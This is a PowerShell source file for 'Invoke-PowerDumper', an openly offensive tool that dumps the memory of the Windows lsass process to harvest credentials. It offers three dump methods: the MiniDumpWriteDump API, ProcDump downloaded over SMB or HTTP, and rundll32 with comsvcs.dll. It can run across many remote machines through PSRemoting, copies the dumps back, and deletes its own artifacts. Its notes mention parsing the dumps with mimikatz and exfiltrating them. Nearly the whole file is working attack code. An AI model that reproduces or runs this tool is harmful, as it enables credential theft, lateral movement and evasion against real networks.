function Invoke-PowerDumper {
    <#
        .NOTES
        Requires Administrative privileges on the target system. You can parse the dmp file with mimikatz, pypykatz, etc. 
        If you have administrator access to the remote machine (local or domain) then it is implied that you can use 
        PSRemoting to retrieve the dmp file. Otherwise you can use SMB, WMI, FTP, NetCat, etc. to exfiltrate the dmp file.

        Mutually Exclusive Parameters:
            * If DumpMethod is MiniDump
                - MiniDumpType - default value dumps the process in a format that can be parsed by pypykatz and mimikatz

            * If DumpMethod is ProcDump
                - ProcDumpExecMethod - default value uses SMB to execute Procdump.exe via \\live.sysinternals.com\tools\Procdump.exe

        If no arguments are specified (e.g. Invoke-PowerDumper) the default DumpMethod is ProcDump using SMB to execute Procdump.exe

        .DESCRIPTION 
        PowerDumper dumps the specified process memory into a .dmp file using various methods.
        Dump Methods:
         * MiniDump - MiniDumpWriteDump Win32 API function
         * ProcDump - Execute ProcDump via SMB or HTTP (ProcDumpExecMethod argument)
         * ComsvcsDLL - Execute comsvcs minidump with rundll32.exe
    #>

    [CmdletBinding(DefaultParameterSetName = "ProcDump")]
    param (
        [Parameter(Mandatory = $false, Position = 0)]
        [ValidateNotNullOrEmpty()]
        $ProcessName = "lsass",

        [Parameter(Mandatory = $false, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [ValidatePattern(".*\.dmp$")]
        [string]$OutFile = "C:\Windows\Temp\$($env:COMPUTERNAME)_$($ProcessName)_$((Get-Date).ToString("MMddyyyy_HHmmss")).dmp",

        [Parameter(Mandatory = $false, Position = 2)]
        [ValidateSet("MiniDump", "ProcDump", "ComsvcsDLL")]
        [string]$DumpMethod = "ProcDump",

        [Parameter(Mandatory = $false, Position = 3)]
        [System.Management.Automation.PSCredential]$Credential,
        
        [Parameter(Mandatory = $false, Position = 4)]
        [string[]]$ComputerName,

        [Parameter(Mandatory = $false, Position = 5)]
        [bool]$RemoveArtifacts = $True,

        [Parameter(Mandatory = $false, Position = 6)]
        [bool]$RemovePSSessions = $True,

        [Parameter(Mandatory = $false, ParameterSetName = "MiniDump")]
        [ValidateSet("MiniDumpWithDataSegs",
        "MiniDumpWithFullMemory",
        "MiniDumpWithHandleData",
        "MiniDumpFilterMemory",
        "MiniDumpScanMemory",
        "MiniDumpWithUnloadedModules",
        "MiniDumpWithIndirectlyReferencedMemory",
        "MiniDumpFilterModulePaths",
        "MiniDumpWithProcessThreadData",
        "MiniDumpWithPrivateReadWriteMemory",
        "MiniDumpWithoutOptionalData",
        "MiniDumpWithFullMemoryInfo",
        "MiniDumpWithThreadInfo",
        "MiniDumpWithCodeSegs",
        "MiniDumpWithoutAuxiliaryState",
        "MiniDumpWithFullAuxiliaryState",
        "MiniDumpWithPrivateWriteCopyMemory",
        "MiniDumpIgnoreInaccessibleMemory",
        "MiniDumpWithTokenInformation",
        "MiniDumpWithModuleHeaders",
        "MiniDumpFilterTriage",
        "MiniDumpWithAvxXStateContext",
        "MiniDumpWithIptTrace",
        "MiniDumpScanInaccessiblePartialPages",
        "MiniDumpValidTypeFlags")]
        [String[]]$MiniDumpType = "MiniDumpWithFullMemory",

        [Parameter(Mandatory = $false, HelpMessage = "The method to be used to execute sysinternals procdump (Default: SMB)", ParameterSetName = "ProcDump")]
        [ValidateSet("SMB", "HTTP")]
        [string]$ProcDumpExecMethod = "HTTP"
    )

    
    #TODO:
    # Add async mechanism to download the .dmp files


    # MiniDumpWriteDump----------------------------------------------------------------------------------------------------------------------------------------------------------
    $MiniDump = {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory = $false)]
            [ValidateNotNullOrEmpty()]
            $ProcessName,

            [Parameter(Mandatory = $false)]
            [ValidateNotNullOrEmpty()]
            [ValidatePattern(".*\.dmp$")]
            [string]$OutFile,

            [Parameter(Mandatory = $false)]
            [ValidateSet("MiniDumpWithDataSegs",
            "MiniDumpWithFullMemory",
            "MiniDumpWithHandleData",
            "MiniDumpFilterMemory",
            "MiniDumpScanMemory",
            "MiniDumpWithUnloadedModules",
            "MiniDumpWithIndirectlyReferencedMemory",
            "MiniDumpFilterModulePaths",
            "MiniDumpWithProcessThreadData",
            "MiniDumpWithPrivateReadWriteMemory",
            "MiniDumpWithoutOptionalData",
            "MiniDumpWithFullMemoryInfo",
            "MiniDumpWithThreadInfo",
            "MiniDumpWithCodeSegs",
            "MiniDumpWithoutAuxiliaryState",
            "MiniDumpWithFullAuxiliaryState",
            "MiniDumpWithPrivateWriteCopyMemory",
            "MiniDumpIgnoreInaccessibleMemory",
            "MiniDumpWithTokenInformation",
            "MiniDumpWithModuleHeaders",
            "MiniDumpFilterTriage",
            "MiniDumpWithAvxXStateContext",
            "MiniDumpWithIptTrace",
            "MiniDumpScanInaccessiblePartialPages",
            "MiniDumpValidTypeFlags")]
            [String[]]$MiniDumpType
        )

        Add-Type -Namespace "Win32" -Name "DebugHelp" -MemberDefinition @"
        //https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-ProcessMiniDump.ps1
        //https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
        //https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump
        //https://www.pinvoke.net/default.aspx/dbghelp/MiniDumpWriteDump.html

        [DllImport("Dbghelp.dll")]
        public static extern bool MiniDumpWriteDump(  
            IntPtr hProcess,
            uint ProcessId,
            IntPtr hFile,
            int DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam
        );

        //https://gist.github.com/JonCole/aa1c732b77bf4ce28d3d
        public enum MINIDUMP_TYPE : int {
            MiniDumpNormal = 0x00000000,
            MiniDumpWithDataSegs = 0x00000001,
            MiniDumpWithFullMemory = 0x00000002,
            MiniDumpWithHandleData = 0x00000004,
            MiniDumpFilterMemory = 0x00000008,
            MiniDumpScanMemory = 0x00000010,
            MiniDumpWithUnloadedModules = 0x00000020,
            MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
            MiniDumpFilterModulePaths = 0x00000080,
            MiniDumpWithProcessThreadData = 0x00000100,
            MiniDumpWithPrivateReadWriteMemory = 0x00000200,
            MiniDumpWithoutOptionalData = 0x00000400,
            MiniDumpWithFullMemoryInfo = 0x00000800,
            MiniDumpWithThreadInfo = 0x00001000,
            MiniDumpWithCodeSegs = 0x00002000,
            MiniDumpWithoutAuxiliaryState = 0x00004000,
            MiniDumpWithFullAuxiliaryState = 0x00008000,
            MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
            MiniDumpIgnoreInaccessibleMemory = 0x00020000,
            MiniDumpWithTokenInformation = 0x00040000,
            MiniDumpWithModuleHeaders = 0x00080000,
            MiniDumpFilterTriage = 0x00100000,
            MiniDumpValidTypeFlags = 0x001fffff
        }
"@;
        Write-Host "[*]: Running on $env:COMPUTERNAME as $env:USERNAME" -ForegroundColor Yellow;
        $Process = (Get-Process -Name $ProcessName);
        $WorkingDirectory = ([System.IO.Path]::GetDirectoryName($OutFile));

        if([string]::IsNullOrEmpty($WorkingDirectory)){
            $WorkingDirectory = "C:\Windows\Temp";
        }

        $OutFile = ([System.IO.Path]::GetFileName($OutFile));
        [System.IO.FileStream]$FileStreamObject = $null;
        [string]$MiniDumpTypeVal = $null

        Set-Location -Path $WorkingDirectory;
        Write-Host "[*]: Working directory set to: $WorkingDirectory" -ForegroundColor Yellow;
        $MiniDumpType | %{ $MiniDumpTypeVal = $MiniDumpTypeVal -bor [Win32.DebugHelp+MINIDUMP_TYPE]::$_ }

        try{
            $FileStreamObject = [System.IO.File]::Open("$WorkingDirectory\$OutFile", [System.IO.FileMode]::Create);
        }catch{
            Write-Host $_
        }

        $retVal = [Win32.DebugHelp]::MiniDumpWriteDump([System.IntPtr]::new([int]$Process.Handle), [int]($Process.Id), [System.IntPtr]($FileStreamObject.Handle), [int]($MiniDumpTypeVal), [System.IntPtr]::Zero, [System.IntPtr]::Zero, [System.IntPtr]::Zero);

        if($retVal){
            Write-Host "[>]: Process data has been dumped to $WorkingDirectory\$OutFile" -ForegroundColor Green;
        }

        $FileStreamObject.Close();
    }

    # Procdump - smb and http execution methods-------------------------------------------------------------------------------------------------------------------------------------------
    $ProcDump = {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory = $false)]
            [ValidateNotNullOrEmpty()]
            $ProcessName,

            [Parameter(Mandatory = $false)]
            [ValidateNotNullOrEmpty()]
            [ValidatePattern(".*\.dmp$")]
            [string]$OutFile,

            [Parameter(Mandatory = $false, HelpMessage = "The method to be used to retrieve and run sysinternals procdump (Default: SMB)")]
            [ValidateSet("SMB", "HTTP")]
            [string]$ProcDumpExecMethod,

            [Parameter(Mandatory = $false)]
            [bool]$RemoveArtifacts
        )

        Write-Host "[*]: Running on $env:COMPUTERNAME as $env:USERNAME" -ForegroundColor Yellow;
        $Process = (Get-Process -Name $ProcessName);
        $WorkingDirectory = ([System.IO.Path]::GetDirectoryName($OutFile));

        if([string]::IsNullOrEmpty($WorkingDirectory)){
            $WorkingDirectory = "C:\Windows\Temp";
        }

        $OutFile = ([System.IO.Path]::GetFileName($OutFile));

        Set-Location -Path $WorkingDirectory;
        Write-Host "[*]: Working directory set to: $WorkingDirectory" -ForegroundColor Yellow;

        if($ProcDumpExecMethod -eq "SMB"){
            & "\\live.sysinternals.com\tools\Procdump.exe" -accepteula -ma $Process.Id $OutFile;
            Write-Host "[>]: Process data has been dumped to $WorkingDirectory\$OutFile" -ForegroundColor Green;
        }elseif ($ProcDumpExecMethod -eq "HTTP") {
            Invoke-WebRequest -Uri "http://live.sysinternals.com/Procdump.exe" -OutFile "Procdump.exe" -UseBasicParsing;
            . "$WorkingDirectory\Procdump.exe" -accepteula -ma $Process.Id $OutFile;
            
            if($RemoveArtifacts){
                Remove-Item -Path "$WorkingDirectory\Procdump.exe" -Force -Recurse;
            }

            Write-Host "[>]: Process data has been dumped to $WorkingDirectory\$OutFile" -ForegroundColor Green;
        }
    }

    #Comsvcs.dll----------------------------------------------------------------------------------------------------------------------------------------------------------
    $ComsvcsDLL = {
        [CmdletBinding()]
        param (
            [Parameter(Mandatory = $false)]
            [ValidateNotNullOrEmpty()]
            $ProcessName,

            [Parameter(Mandatory = $false)]
            [ValidateNotNullOrEmpty()]
            [ValidatePattern(".*\.dmp$")]
            [string]$OutFile
        )
        
        Write-Host "[*]: Running on $env:COMPUTERNAME as $env:USERNAME" -ForegroundColor Yellow;
        $Process = (Get-Process -Name $ProcessName);
        $WorkingDirectory = ([System.IO.Path]::GetDirectoryName($OutFile));

        if([string]::IsNullOrEmpty($WorkingDirectory)){
            $WorkingDirectory = "C:\Windows\Temp";
        }

        $OutFile = ([System.IO.Path]::GetFileName($OutFile));

        Set-Location -Path $WorkingDirectory;
        Write-Host "[*]: Working directory set to: $WorkingDirectory" -ForegroundColor Yellow;

        try{
            . "C:\Windows\System32\rundll32.exe" "C:\Windows\System32\comsvcs.dll", MiniDump $Process.Id $OutFile full;
            Write-Host "[>]: Process data has been dumped to $WorkingDirectory\$OutFile" -ForegroundColor Green;
        }catch{
            Write-Host $_
        }
    }

    
    #Begin - Parse command line arguments
    $SessionCredential = $null;

    if($Credential){
        $SessionCredential = @{
            Credential = $Credential
        }
    }

    if(-not $ComputerName){
        switch ($DumpMethod) {
            "MiniDump" { 
                Invoke-Command -ScriptBlock $MiniDump -ArgumentList @($ProcessName, $OutFile, $MiniDumpType);
            }
            "ProcDump" {
                Invoke-Command -ScriptBlock $ProcDump -ArgumentList @($ProcessName, $OutFile, $ProcDumpExecMethod, $RemoveArtifacts);
            }
            "ComsvcsDLL" {
                Invoke-Command -ScriptBlock $ComsvcsDLL -ArgumentList @($ProcessName, $OutFile);
            }
        }

    }elseif ($ComputerName) {
        switch ($DumpMethod) {
            "MiniDump" { 
                foreach($Target in $ComputerName){
                    $Filename = "$($Target)_$($ProcessName).dmp";
                    $RemotePath = "$([System.IO.Path]::GetDirectoryName($OutFile))\$Filename";
                   
                    $PSSession = New-PSSession -ComputerName $Target @SessionCredential;
                    Invoke-Command -ScriptBlock $MiniDump -ArgumentList @($ProcessName, $RemotePath, $MiniDumpType) -Session $PSSession;
                    Copy-Item -Path $RemotePath -Destination "$((Get-Location).Path)\$Filename" -FromSession $PSSession;
                    Write-Host "[>]: Dump file has been copied to $((Get-Location).Path)\$Filename" -ForegroundColor Green;

                    if($RemoveArtifacts){
                        Invoke-Command -ScriptBlock { param($Path) Remove-Item -Path $Path -Force -Recurse } -ArgumentList $RemotePath -Session $PSSession;
                        Write-Host "[>]: Remote file at $RemotePath has been removed" -ForegroundColor Green;
                    }
 
                    if($RemovePSSessions){
                        Remove-PSSession -Session $PSSession;
                        Write-Host "[>]: PSSession $($PSSession.Name) has been removed" -ForegroundColor Green;
                    }
                }
            }
            "ProcDump" {
                foreach($Target in $ComputerName){
                    $Filename = "$($Target)_$($ProcessName).dmp";
                    $RemotePath = "$([System.IO.Path]::GetDirectoryName($OutFile))\$Filename";
                    
                    $PSSession = New-PSSession -ComputerName $Target @SessionCredential;
                    Invoke-Command -ScriptBlock $ProcDump -ArgumentList @($ProcessName, $RemotePath, $ProcDumpExecMethod, $RemoveArtifacts) -Session $PSSession;
                    Copy-Item -Path $RemotePath -Destination "$((Get-Location).Path)\$Filename" -FromSession $PSSession;
                    Write-Host "[>]: Dump file has been copied to $((Get-Location).Path)\$Filename" -ForegroundColor Green;
 
                    if($RemoveArtifacts){
                        Invoke-Command -ScriptBlock { param($Path) Remove-Item -Path $Path -Force -Recurse } -ArgumentList $RemotePath -Session $PSSession;
                        Write-Host "[>]: Remote file at $RemotePath has been removed" -ForegroundColor Green;
                    }
 
                    if($RemovePSSessions){
                        Remove-PSSession -Session $PSSession;
                        Write-Host "[>]: PSSession $($PSSession.Name) has been removed" -ForegroundColor Green;
                    }
                }
            }
            "ComsvcsDLL" {
                foreach($Target in $ComputerName){
                    $Filename = "$($Target)_$($ProcessName).dmp";
                    $RemotePath = "$([System.IO.Path]::GetDirectoryName($OutFile))\$Filename";
                    
                    $PSSession = New-PSSession -ComputerName $Target @SessionCredential;
                    Invoke-Command -ScriptBlock $ComsvcsDLL -ArgumentList @($ProcessName, $RemotePath) -Session $PSSession;
                    Copy-Item -Path $RemotePath -Destination "$((Get-Location).Path)\$Filename" -FromSession $PSSession;
                    Write-Host "[>]: Dump file has been copied to $((Get-Location).Path)\$Filename" -ForegroundColor Green;
 
                    if($RemoveArtifacts){
                        Invoke-Command -ScriptBlock { param($Path) Remove-Item -Path $Path -Force -Recurse } -ArgumentList $RemotePath -Session $PSSession;
                        Write-Host "[>]: Remote file at $RemotePath has been removed" -ForegroundColor Green;
                    }
 
                    if($RemovePSSessions){
                        Remove-PSSession -Session $PSSession;
                        Write-Host "[>]: PSSession $($PSSession.Name) has been removed" -ForegroundColor Green;
                    }
                }
            }
        }
    }
}

function Check-RunAsAdministrator {
    if([System.Security.Principal.WindowsPrincipal]::new([System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)){
        Write-Host "[>]: This shell is running as administrator!" -ForegroundColor Green;
    }else {
        Write-Host "[X]: This shell is NOT running as administrator!" -ForegroundColor Red;
    }
}